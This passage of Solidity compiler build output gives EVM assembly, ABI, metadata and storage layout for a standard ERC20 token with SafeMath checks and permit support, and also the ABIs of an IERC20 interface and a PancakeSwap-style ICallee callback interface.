											"value": "64732D6D6174682D7375622D756E646572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "58"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "REVERT"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "tag",
											"value": "72"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP4"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "DUP2"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2690,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "MSTORE"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SWAP1"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "KECCAK256"
										},
										{
											"begin": 2681,
											"end": 2696,
											"name": "SLOAD"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2701,
											"end": 2706,
											"name": "DUP3"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2681,
											"end": 2700,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "AND"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 2681,
											"end": 2707,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP6"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "AND"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP2"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2672,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "MSTORE"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP1"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "DUP3"
										},
										{
											"begin": 2663,
											"end": 2678,
											"name": "KECCAK256"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP1"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SWAP4"
										},
										{
											"begin": 2663,
											"end": 2707,
											"name": "SSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SWAP1"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP5"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "DUP2"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "MSTORE"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "KECCAK256"
										},
										{
											"begin": 2733,
											"end": 2746,
											"name": "SLOAD"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH [tag]",
											"value": "86"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2751,
											"end": 2756,
											"name": "DUP3"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2733,
											"end": 2750,
											"name": "PUSH [tag]",
											"value": "87"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "AND"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "tag",
											"value": "86"
										},
										{
											"begin": 2733,
											"end": 2757,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP5"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "AND"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2726,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "MSTORE"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "DUP3"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "KECCAK256"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP1"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SWAP5"
										},
										{
											"begin": 2717,
											"end": 2757,
											"name": "SSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP6"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MSTORE"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "MLOAD"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP2"
										},
										{
											"begin": 2717,
											"end": 2730,
											"name": "SWAP4"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP8"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "AND"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "PUSH",
											"value": "DDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP2"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "DUP3"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SUB"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "ADD"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "SWAP1"
										},
										{
											"begin": 2772,
											"end": 2797,
											"name": "LOG3"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "POP"
										},
										{
											"begin": 2585,
											"end": 2804,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "tag",
											"value": "87"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "ADD"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "LT"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "ISZERO"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "JUMPI"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6164642D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SUB"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "REVERT"
										}
									]
								},
								"8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429"
							}
						},
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"PERMIT_TYPEHASH()": "30adf81f",
							"_frozenBalance(address)": "47d5d856",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_frozenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/ERC20.sol\":\"ERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/ERC20.sol\":{\"keccak256\":\"0x59f3a9c274714d7b3493d7898f412eee5e2aa3df408df3a67134f5333112aaab\",\"urls\":[\"bzz-raw://45d02bb45a633b1dac3a8bb29be50cb07117f65e11a2c7214290a7d9e34c9688\",\"dweb:/ipfs/Qme3WmF8PrqUH7D9XggNYZEaHHR2nTLd2Ld7C14T68TgY3\"]},\"src/IERC20.sol\":{\"keccak256\":\"0xa45dab2f2a6e81dff31d7f62a0b0513ae09f7f01ee22d0970e2b532e2b14fad8\",\"urls\":[\"bzz-raw://5b5177e85ae0239a5d633ca2d83652b0fc63622f0bc317a3d32a3661f50d7537\",\"dweb:/ipfs/QmdV9Jp5icxxC3SYVVuwQTKXMcWicDToahxUxdkFCJC4M9\"]},\"src/SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 19,
								"contract": "src/ERC20.sol:ERC20",
								"label": "totalSupply",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 23,
								"contract": "src/ERC20.sol:ERC20",
								"label": "balanceOf",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 29,
								"contract": "src/ERC20.sol:ERC20",
								"label": "allowance",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 33,
								"contract": "src/ERC20.sol:ERC20",
								"label": "_frozenBalance",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 35,
								"contract": "src/ERC20.sol:ERC20",
								"label": "DOMAIN_SEPARATOR",
								"offset": 0,
								"slot": "4",
								"type": "t_bytes32"
							},
							{
								"astId": 42,
								"contract": "src/ERC20.sol:ERC20",
								"label": "nonces",
								"offset": 0,
								"slot": "5",
								"type": "t_mapping(t_address,t_uint256)"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/ICallee.sol": {
				"ICallee": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "pancakeCall",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"pancakeCall(address,uint256,uint256,bytes)": "84800812"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"pancakeCall\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/ICallee.sol\":\"ICallee\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/ICallee.sol\":{\"keccak256\":\"0xdd42904310b0f5d040eef9abb7b14327315f8437576e7fc7c1ea004130bf138a\",\"urls\":[\"bzz-raw://6377a208affde795cbdbd2024e38b1dd7ddabd51cc106974ad583d062a636de1\",\"dweb:/ipfs/QmNgMBbkfLbuf9yZSqY57HR5Nh8esYyGXgHNnSY2K1DsNe\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
